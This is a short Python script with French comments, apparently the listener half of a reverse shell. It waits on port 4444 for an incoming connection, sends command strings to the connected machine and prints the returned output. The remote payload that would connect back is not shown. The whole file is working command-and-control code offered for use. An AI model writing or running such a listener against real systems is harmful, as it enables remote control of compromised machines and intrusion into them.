import socket

HOST = '0.0.0.0'  # Écoute toutes les interfaces
PORT = 4444


class Shell:
    def __init__(self,ip, port):
        self.ip = ip
        self.port = port

    def listen(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((HOST, self.port))
        self.server.listen(1)

        print(f"[+] En attente de connexion sur le port {self.port}...")
        self.client_socket, self.client_address = self.server.accept()
        print(f"[+] Connexion reçue de {self.client_address}")
        return True

    def execute(self, command):
        cmd = command
        self.client_socket.sendall(cmd.encode())
        result = self.client_socket.recv(4096).decode(errors='ignore')
        return result

    def break_connection(self):
        self.client_socket.close()
        self.server.close()

